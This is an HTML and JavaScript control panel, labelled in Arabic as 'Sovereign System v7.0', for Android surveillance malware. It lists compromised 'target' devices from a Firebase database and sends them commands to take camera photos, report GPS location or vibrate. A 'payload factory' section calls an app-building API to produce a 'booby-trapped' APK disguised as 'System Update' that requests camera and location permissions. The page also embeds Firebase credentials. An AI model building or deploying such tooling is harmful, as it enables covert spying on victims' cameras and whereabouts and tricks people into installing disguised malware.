<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Sovereign System v7.0 | أمين الزواحي</title>
    <style>
        :root { --gold: #d4af37; --online: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--gold); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; }
        .layout { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; overflow-y: auto; position: relative; }
        
        /* الرادار المطور */
        .radar-box { width: 100px; height: 100px; border: 1px solid var(--gold); border-radius: 50%; margin: 0 auto 20px; position: relative; background: radial-gradient(circle, #002200, #000); overflow: hidden; }
        .radar-sweep { position: absolute; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent, rgba(0,255,65,0.3)); animation: sweep 3s linear infinite; }
        @keyframes sweep { to { transform: rotate(360deg); } }

        .device-node { border: 1px solid #222; padding: 12px; margin-bottom: 10px; cursor: pointer; border-radius: 8px; position: relative; transition: 0.3s; }
        .device-node:hover { background: #111; border-color: var(--gold); }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; left: 10px; top: 15px; }
        .online { background: var(--online); box-shadow: 0 0 10px var(--online); }
        
        .main { padding: 25px; overflow-y: auto; }
        .box { background: #111; border: 1px dashed var(--gold); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        button { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--gold); color: var(--gold); cursor: pointer; font-weight: bold; margin: 5px 0; }
        button:hover { background: var(--gold); color: #000; }
        #gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 20px; }
        img { width: 100%; border: 1px solid #333; border-radius: 5px; }
    </style>
</head>
<body>

<div class="layout">
    <div class="sidebar">
        <div class="radar-box"><div class="radar-sweep"></div></div>
        <h3 style="text-align:center;">إدارة السيادة 🛰️</h3>
        <div id="target-list">البحث عن إشارات...</div>
    </div>

    <div class="main">
        <div class="box">
            <h3>🛠️ مصنع البايلود وربط الـ API</h3>
            <input type="text" id="api-key" placeholder="ضع مفتاح Appilix API هنا" style="width:95%; padding:10px; background:#000; border:1px solid var(--gold); color:#fff; margin-bottom:10px;">
            <button onclick="generateSovereignAPK()">بناء تطبيق APK ملغم (رسمي)</button>
            <div id="build-status" style="margin-top:10px; font-size:12px;"></div>
        </div>

        <div id="control-unit" style="display:none;">
            <h2 id="target-id" style="border-bottom: 1px solid var(--gold);">التحكم: ---</h2>
            <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px;">
                <button onclick="sendCommand('capture')">📸 صورة كاميرا</button>
                <button onclick="sendCommand('gps')">📍 موقع GPS</button>
                <button onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
            </div>
            <h4>المعرض المستلم:</h4>
            <div id="gallery"></div>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

<script>
    // بيانات Firebase الخاصة بك (لا تغيرها)
    const firebaseConfig = {
        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
        authDomain: "hkrs5000.firebaseapp.com",
        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
        projectId: "hkrs5000",
        storageBucket: "hkrs5000.firebasestorage.app",
        messagingSenderId: "273977078526",
        appId: "1:273977078526:web:da9e512c2421c300352baf"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentID = null;

    // تحديث الرادار والأهداف
    db.ref('devices').on('value', snap => {
        const list = document.getElementById('target-list'); list.innerHTML = "";
        snap.forEach(child => {
            const d = child.val();
            const isOnline = (Date.now() - (d.lastSeen || 0)) < 15000;
            const node = document.createElement('div');
            node.className = "device-node";
            node.innerHTML = `<div class="status-dot ${isOnline ? 'online' : ''}"></div><b>ID: ${child.key}</b><br><small>${d.platform || 'Android'}</small>`;
            node.onclick = () => {
                currentID = child.key;
                document.getElementById('control-unit').style.display = "block";
                document.getElementById('target-id').innerText = "تحكم الزعيم: " + child.key;
                loadMedia(child.key);
            };
            list.appendChild(node);
        });
    });

    function sendCommand(act) {
        if(!currentID) return;
        db.ref('commands/'+currentID).set({ action: act, ts: Date.now() });
        if(act === 'gps') {
            db.ref('devices/'+currentID).once('value', s => {
                if(s.val().lat) window.open(`https://www.google.com/maps?q=${s.val().lat},${s.val().lon}`);
            });
        }
    }

    function loadMedia(id) {
        db.ref(`data/${id}/images`).on('value', snap => {
            const gal = document.getElementById('gallery'); gal.innerHTML = "";
            snap.forEach(img => {
                const el = document.createElement('img'); el.src = img.val().url;
                gal.appendChild(el);
            });
        });
    }

    async function generateSovereignAPK() {
        const key = document.getElementById('api-key').value;
        const status = document.getElementById('build-status');
        const targetUrl = window.location.href.split('?')[0] + "?mode=payload";
        
        status.innerText = "جاري الاتصال بسيرفر البناء... 🛠️";
        
        try {
            const res = await fetch('https://pwa.appilix.com/api/build', {
                method: 'POST',
                headers: {'X-API-KEY': key, 'Content-Type': 'application/json'},
                body: JSON.stringify({ url: targetUrl, appName: "System Update", permissions: ["camera", "location"] })
            });
            const data = await res.json();
            if(data.status === 'success') {
                status.innerHTML = `<a href="${data.download_url}" style="color:var(--online);">تم البناء! اضغط هنا لتنزيل الـ APK الملغم ✅</a>`;
            } else { status.innerText = "خطأ: " + data.message; }
        } catch(e) { status.innerText = "فشل في الربط بالموقع."; }
    }
</script>
</body>
</html>
